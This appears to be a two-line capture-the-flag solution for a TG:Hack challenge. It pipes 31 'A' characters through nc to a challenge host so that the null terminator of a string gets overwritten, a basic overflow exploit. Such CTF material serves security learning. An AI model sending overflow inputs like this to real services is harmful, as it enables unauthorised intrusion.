# Send enough letters to overwrite the nullbyte terminator for the student string
python -c 'print "A" * 31' | nc pwntion1.tghack.no 1061
